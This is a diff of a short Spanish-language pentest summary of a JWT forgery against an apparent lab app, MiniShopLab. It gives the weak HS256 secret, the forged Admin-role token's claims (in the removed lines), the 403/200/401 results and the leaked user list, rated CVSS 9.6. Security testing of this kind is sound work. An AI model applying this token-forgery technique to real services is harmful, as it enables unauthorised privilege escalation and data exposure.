@@ -1,29 +1,17 @@
-=== JWT Forgery Summary ===
-
-Secreto HS256: MiniShopLab2026 (15 bytes, zero-padded a 32)
+=== JWT Forgery (2026-10-29) ===
+Secreto: MiniShopLab2026 (15 bytes, zero-padded a 32)
 Algoritmo: HS256
 
-1. Token legítimo (role=Cliente) → GET /api/admin: HTTP 403
-2. Token FORJADO  (role=Admin)  → GET /api/admin: HTTP 200
-3. Token secreto incorrecto     → GET /api/admin: HTTP 401
-
-Payload forjado:
-{
-  "sub": "1",
-  "unique_name": "cliente-a",
-  "role": "Admin",
-  "exp": 1792987007,
-  "iss": "MiniShopLab",
-  "aud": "MiniShopLab"
-}
+JWT legítimo (role=Cliente) → GET /api/admin: 403
+JWT FORJADO  (role=Admin)  → GET /api/admin: 200
+JWT secreto incorrecto     → GET /api/admin: 401
 
 Respuesta /api/admin con token forjado:
-{"users":[{"id":1,"username":"cliente-a","role":"Cliente"},
-          {"id":2,"username":"cliente-b","role":"Cliente"},
-          {"id":3,"username":"cliente-xss","role":"Cliente"},
-          {"id":4,"username":"cliente-brute","role":"Cliente"},
-          {"id":5,"username":"admin-lab","role":"Admin"}]}
-
-→ Escalación de privilegios CONFIRMADA
-→ Secreto débil permite forgery completo
-→ CVSS 9.6 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)
+{"users":[
+  {"id":1,"username":"cliente-a","role":"Cliente"},
+  {"id":2,"username":"cliente-b","role":"Cliente"},
+  {"id":3,"username":"cliente-xss","role":"Cliente"},
+  {"id":4,"username":"cliente-brute","role":"Cliente"},
+  {"id":5,"username":"admin-lab","role":"Admin"}
+]}
+→ CVSS 9.6 Critical
